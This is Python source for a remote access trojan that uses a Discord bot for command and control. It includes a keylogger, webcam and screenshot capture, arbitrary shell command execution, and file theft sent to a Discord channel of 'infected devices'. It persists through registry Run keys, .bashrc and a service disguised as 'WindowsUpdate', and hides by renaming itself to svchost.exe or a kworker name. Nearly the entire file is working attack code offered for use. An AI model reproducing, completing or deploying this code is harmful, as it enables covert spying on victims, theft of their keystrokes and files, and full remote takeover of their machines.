import discord
import os
import pyautogui
import subprocess
import sys
import requests
import threading
import platform
import cv2
import socket
import json
from pynput.keyboard import Listener

# 🚨 Do NOT hardcode your token! Store in environment variable
TOKEN = "DISCORD_BOT_TOKEN"

session_id = None   # Define session_id as a global variable 

intents = discord.Intents.default()
client = discord.Client(intents=intents)
log_file = "keystrokes.txt"
SESSIONS_FILE = "sessions.json"

# Load existing sessions
def load_sessions():
    if os.path.exists(SESSIONS_FILE):
        with open(SESSIONS_FILE, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}  # Return empty if file is corrupted
    return {}

# Save sessions
def save_sessions(sessions):
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

# Initialize sessions
sessions = load_sessions()

# Get Unique Machine ID
def get_session_id():
    return f"{platform.system()}-{platform.node()}-{socket.gethostname()}"

session_id = get_session_id()

# Take ScreenShot to victim device screen
def capture_screenshot(session_id):
    screenshot_path = f"{session_id}_screenshot.png"

    if platform.system() == "Windows":
        try:
            pyautogui.screenshot(screenshot_path)
        except Exception as e:
            return f"❌ Error: {str(e)}"
    elif platform.system() == "Linux":
        try:
            # Ensure gnome-screenshot is installed
            if os.system("which gnome-screenshot") == 0:
                os.system(f"gnome-screenshot -f {screenshot_path}")
            else:
                return "❌ Error: `gnome-screenshot` is missing. Install it using: `sudo apt install gnome-screenshot`"
        except Exception as e:
            return f"❌ Error: {str(e)}"
    else:
        return "❌ Error: Unsupported OS"

    return screenshot_path


# Hide Console (Stealth Mode)
def hide_console():
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif platform.system() == "Linux":
        os.system("xdotool search --onlyvisible --class Terminal windowunmap")

# Persistence (Auto-Start)
def add_persistence():
    rat_path = os.path.abspath(sys.argv[0])

    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

            # Check if persistence already exists
            with winreg.OpenKey(key, path, 0, winreg.KEY_READ) as reg:
                try:
                    existing_value, _ = winreg.QueryValueEx(reg, "WindowsUpdate")
                    if existing_value == rat_path:
                        print("[+] Persistence already exists.")
                        return
                except FileNotFoundError:
                    pass

            # Add persistence
            with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, rat_path)
                print(f"[+] Persistence added: {rat_path}")

        except Exception as e:
            print(f"[-] Windows Persistence Error: {e}")

    elif platform.system() == "Linux":
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            autostart_cmd = f"python3 {rat_path} &"

            # Check if already exists
            with open(bashrc, "r") as f:
                if autostart_cmd in f.read():
                    print("[+] Persistence already exists.")
                    return

            # Add persistence
            with open(bashrc, "a") as f:
                f.write(f"\n# RAT persistence\n{autostart_cmd}\n")
            os.system("source ~/.bashrc")
            print(f"[+] Persistence added: {rat_path}")

        except Exception as e:
            print(f"[-] Linux Persistence Error: {e}")

    else:
        print("[-] Unsupported OS for persistence.")


# Function to split large outputs
def chunk_message(message, chunk_size=1900):
    return [message[i:i + chunk_size] for i in range(0, len(message), chunk_size)]


# Keylogger
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Keylogger Write Error: {e}")

# Keylogger with Exception Handling for Linux (X11)
def start_keylogger():
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except TypeError as e:
        print(f"⚠️ Keylogger Error Ignored: {e}")


# Webcam Capture
def capture_webcam(session_id):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    image_path = f"{session_id}_webcam.jpg"

    if ret:
        cv2.imwrite(image_path, frame)
        cam.release()
        return image_path  # Return the path to the saved image
    else:
        cam.release()
        return None  # Return None if the capture fails


# Auto-Hide On Rat Startup
def stealth_mode():
    if platform.system() == "Windows":
        # hide_console()
        rename_process()
        run_as_service()
    elif platform.system() == "Linux":
        hide_process_name()
        hide_from_ps()


# Function define for stealth mode fun code.
def rename_process():
    new_name = "svchost.exe"
    os.system(f"rename {sys.argv[0]} {new_name}")

def run_as_service():
    rat_path = os.path.abspath(sys.argv[0])
    service_cmd = f'sc create WindowsUpdate binPath= "{rat_path}" start= auto'
    subprocess.run(service_cmd, shell=True)


def hide_process_name():
    sys.argv[0] = "[kworker/0:1]"  # Fake system process

def hide_from_ps():
      os.system("kill -STOP $$")  # Stop process listing in `ps aux`



@client.event
async def on_ready():
    global sessions
    session_id = get_session_id()  # Get a unique session identifier
    hostname = socket.gethostname()
    ip_addr = requests.get("https://api.ipify.org").text

    print(f"✅ Bot is online! Logged in as {client.user}")
    print(f"📌 Debug: Session ID -> {session_id}")
    print(f"📌 Debug: Hostname -> {hostname}, IP -> {ip_addr}")

    #stealth_mode()
    add_persistence()

    # Load existing sessions
    sessions = load_sessions()
    
    # Add new session if not already registered
    if session_id not in sessions:
        sessions[session_id] = "active"
        save_sessions(sessions)  # Save the updated session

    print(f"📌 Debug: Current Sessions -> {sessions}")

    # Notify the Discord channel
    server = client.get_guild(int(DISCORD_SERVER_ID))
    if server:
        category = discord.utils.get(server.categories, name="Infected Devices")
        if not category:
            category = await server.create_category("Infected Devices")
        
        # Create or find the text channel using the hostname
        channel = discord.utils.get(server.text_channels, name=hostname.lower())
        if not channel:
            channel = await server.create_text_channel(hostname, category=category)

        message = f"🖥️ **New RAT Connected:** `{session_id}` is now online!\n" \
                  f"📡 **Hostname:** `{hostname}`\n" \
                  f"🌐 **IP Address:** `{ip_addr}`"
        await channel.send(message)

    # Notify the general "rat-control" channel
    for channel in client.get_all_channels():
        if str(channel) == "rat-control":
            await channel.send(f"🖥️ **New RAT Connected:** `{session_id}` is now online!")
            break


@client.event
async def on_message(message):
    global sessions
    if message.author == client.user:
        return

    # List active sessions
    if message.content == "!list_sessions":
        sessions = load_sessions()  # Reload from file every time
        if sessions:
            session_list = "\n".join([f"🔹 {sid}" for sid in sessions.keys()])
            await message.channel.send(f"**Active Sessions:**\n{session_list}")
        else:
            await message.channel.send("⚠️ No active sessions.")


    # Webcam Capture for Specific Session
    if message.content.startswith("!webcam "):
        parts = message.content.split(" ", 1)
        if len(parts) < 2:
            await message.channel.send("⚠️ Usage: `!webcam <session_id>`")
            return

        target_session = parts[1]  # Extract the requested session ID

        if target_session in sessions:  # Check if the session is active
            if target_session == get_session_id():  # Only execute on the correct machine
                image_path = capture_webcam(target_session)
                if image_path:
                    with open(image_path, "rb") as f:
                        await message.channel.send(f"📸 Webcam Capture from `{target_session}`:", file=discord.File(f, image_path))
                else:
                    await message.channel.send(f"❌ Webcam capture failed for `{target_session}`.")
        else:
            await message.channel.send(f"❌ `{target_session}` is not an active session.")



    # Send command to a specific machine
    # Execute command on a session
    if message.content.startswith("!cmd"):
        parts = message.content.split(" ", 2)

        if len(parts) < 3:
            await message.channel.send("⚠️ Usage: `!cmd <session_id> <command>`")
            return

        target_session, command = parts[1], parts[2]

        if target_session not in sessions:
            await message.channel.send(f"❌ Invalid session ID: `{target_session}`")
            return

        # Initialize the session directory
        if target_session not in sessions:
            sessions[target_session] = os.getcwd()

        # Handle 'cd' command
        if command.startswith("cd"):
            try:
                new_path = command.split(" ", 1)[1] if len(command.split()) > 1 else "~"
                new_path = os.path.expanduser(new_path)
                new_path = os.path.abspath(os.path.join(sessions[target_session], new_path))

                if os.path.isdir(new_path):
                    sessions[target_session] = new_path
                    await message.channel.send(f"📂 Changed directory to: `{new_path}`")
                else:
                    await message.channel.send("❌ Invalid directory.")
            except Exception as e:
                await message.channel.send(f"❌ Directory change failed: {e}")
            return

        # Execute command
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                cwd=sessions[target_session],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                executable="/bin/bash" if os.name != 'nt' else "cmd.exe"
            )
            output, error = process.communicate()

            result = output.decode(errors='ignore') + error.decode(errors='ignore')

            if result.strip():
                chunks = chunk_message(result)
                for chunk in chunks:
                    await message.channel.send(f"📤 Output:```{chunk}```")
            else:
                await message.channel.send("✅ Command executed successfully with no output.")

        except Exception as e:
            await message.channel.send(f"❌ Error executing command: {e}")
    


    # Self-Destruct RAT
    elif message.content == "!selfdestruct":
        await message.channel.send(f"💥 Self-destructing `{session_id}` RAT...")
        os.remove(sys.argv[0])
        sys.exit()


    # Upload file on victim machine


        
    # Download file on victim machine
    elif message.content.startswith("!download"):
        try:
            parts = message.content.split(" ", 2)

            # Validate arguments
            if len(parts) != 3:
                await message.channel.send("⚠️ Usage: `!download <session_id> <file_path>`")
                return

            _, target_session, file_path = parts

            # Validate session
            if target_session not in sessions:
                await message.channel.send(f"❌ Invalid session: `{target_session}`")
                return

            # Normalize and check the file path
            file_path = os.path.abspath(file_path)
            if not os.path.isfile(file_path):
                await message.channel.send(f"❌ File not found: `{file_path}`")
                return

            # Send the file to Discord
            await message.channel.send(f"📥 Downloading `{os.path.basename(file_path)}` from `{target_session}`")
            await message.channel.send(file=discord.File(file_path))

        except Exception as e:
            await message.channel.send(f"❌ Download failed: {e}")


    # Take screenshot on victim machine
    elif message.content.startswith("!screenshot "):
        parts = message.content.split(" ", 1)
        if len(parts) < 2:
            await message.channel.send("⚠️ Usage: `!screenshot <session_id>`")
            return

        target_session = parts[1]
        if target_session in sessions:
            screenshot_path = capture_screenshot(target_session)
            if "Error" in screenshot_path:
                await message.channel.send(screenshot_path)
            else:
                with open(screenshot_path, "rb") as f:
                    await message.channel.send(f"📸 Screenshot from `{target_session}`:", file=discord.File(f, screenshot_path))
        else:
            await message.channel.send(f"❌ No active session found for `{target_session}`")



client.run(TOKEN)